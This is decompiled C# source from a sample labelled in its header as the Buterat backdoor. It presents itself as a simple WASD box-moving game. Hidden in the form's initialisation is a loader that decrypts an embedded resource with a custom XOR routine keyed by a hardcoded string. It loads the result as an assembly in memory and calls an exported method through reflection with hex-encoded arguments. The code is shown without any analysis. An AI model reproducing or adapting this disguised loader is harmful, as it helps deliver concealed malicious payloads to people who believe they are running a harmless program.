// Decompiled with JetBrains decompiler
// Type: TumblrAPI.move_step
// Assembly: EventListe, Version=1.0.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 17402B6D-E2A2-428E-97AD-7F2170B297A3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\Backdoor.Win32.Buterat.frsq-f1c24055722dc6f94c4b223ed4a7bce8ffb5c5bb3030bca735d6ceab513d8d31.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace TumblrAPI
{
  public class move_step : Form
  {
    private bool left;
    private bool right;
    private bool top;
    private bool bottom;
    private IContainer components = (IContainer) null;
    private static object ImageFileMachine;
    private static string Explicit = "SG40FFZ584HXG5GTE555PW";
    private static int CodePage = 66560;
    private Timer timer1;
    private Label label1;
    private Label label2;
    private PictureBox pictureBox1;
    private Label label3;

    public move_step()
    {
      this.InitializeComponent();
      ((System.Type) move_step.ImageFileMachine).GetMethod("rHccSrtg4").Invoke((object) null, new object[3]
      {
        (object) "52756E74696D654D6574686F64496E666F53",
        (object) "4C3168796F726D",
        (object) "TumblrAPI"
      });
    }

    private void move_step_KeyDown(object sender, KeyEventArgs e)
    {
      if (e.KeyCode == Keys.W)
        this.top = true;
      if (e.KeyCode == Keys.A)
        this.left = true;
      if (e.KeyCode == Keys.S)
        this.bottom = true;
      if (e.KeyCode != Keys.D)
        return;
      this.right = true;
    }

    private void numericUpDown1_ValueChanged(object sender, EventArgs e)
    {
    }

    private void move_step_KeyUp(object sender, KeyEventArgs e)
    {
      if (e.KeyCode == Keys.W)
        this.top = false;
      if (e.KeyCode == Keys.A)
        this.left = false;
      if (e.KeyCode == Keys.S)
        this.bottom = false;
      if (e.KeyCode != Keys.D)
        return;
      this.right = false;
    }

    private void move_step_Load(object sender, EventArgs e) => this.timer1.Start();

    private void timer1_Tick(object sender, EventArgs e)
    {
      this.label1.Text = this.pictureBox1.Top.ToString();
      this.label2.Text = this.pictureBox1.Left.ToString();
      if (this.top)
        this.pictureBox1.Top -= 8;
      if (this.left)
        this.pictureBox1.Left -= 8;
      if (this.bottom)
        this.pictureBox1.Top += 8;
      if (this.right)
        this.pictureBox1.Left += 8;
      if (this.pictureBox1.Top > 400)
        this.pictureBox1.Top = 400;
      if (this.pictureBox1.Left > 472)
        this.pictureBox1.Left = 472;
      if (this.pictureBox1.Top < 12)
        this.pictureBox1.Top = 12;
      if (this.pictureBox1.Left >= 12)
        return;
      this.pictureBox1.Left = 12;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.timer1 = new Timer(this.components);
      this.label1 = new Label();
      this.label2 = new Label();
      this.pictureBox1 = new PictureBox();
      this.label3 = new Label();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.timer1.Interval = 20;
      this.timer1.Tick += new EventHandler(this.timer1_Tick);
      this.label1.AutoSize = true;
      this.label1.Location = new Point(15, 14);
      this.label1.Name = "label1";
      this.label1.Size = new Size(49, 13);
      this.label1.TabIndex = 1;
      this.label1.Text = "label1";
      this.label2.AutoSize = true;
      this.label2.Location = new Point(100, 14);
      this.label2.Name = "label2";
      this.label2.Size = new Size(49, 13);
      this.label2.TabIndex = 2;
      this.label2.Text = "label2";
      this.pictureBox1.BackColor = SystemColors.ActiveCaptionText;
      this.pictureBox1.Location = new Point(286, 207);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(111, 87);
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.label3.Location = new Point(12, 474);
      this.label3.Name = "label3";
      this.label3.Size = new Size(100, 18);
      this.label3.TabIndex = 3;
      this.label3.Text = "WASD to move";
      this.AutoScaleDimensions = new SizeF(7f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(681, 501);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.pictureBox1);
      this.Name = nameof (move_step);
      this.Text = "Form1";
      move_step.SponsorState();
      this.Load += new EventHandler(this.move_step_Load);
      this.KeyDown += new KeyEventHandler(this.move_step_KeyDown);
      this.KeyUp += new KeyEventHandler(this.move_step_KeyUp);
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private static void SponsorState()
    {
      byte[] numArray = (byte[]) new ResourceManager(typeof (move_step)).GetObject("Cerard");
      for (int i = 133142; i >= 0; i += -1)
        numArray = move_step.CrossContextChannel(numArray, i, 256);
      move_step.ImageFileMachine = (object) ((Assembly) move_step.EventSlim(numArray)).GetExportedTypes()[1];
    }

    public static object EventSlim(byte[] ConstructionCall) => (object) Assembly.Load(ConstructionCall);

    private static byte[] CrossContextChannel(byte[] tt, int i, int AsyncLocal)
    {
      int num1 = (int) tt[(i + 1) % move_step.CodePage];
      int num2 = (move_step.Hashtable(tt, i, 22) - (num1 + AsyncLocal)) % AsyncLocal;
      tt[i % move_step.CodePage] = (byte) num2;
      return tt;
    }

    private static int Hashtable(byte[] ConstantAttribute, int i, int j) => (int) ConstantAttribute[i % move_step.CodePage] ^ (int) move_step.Explicit[i % j];
  }
}
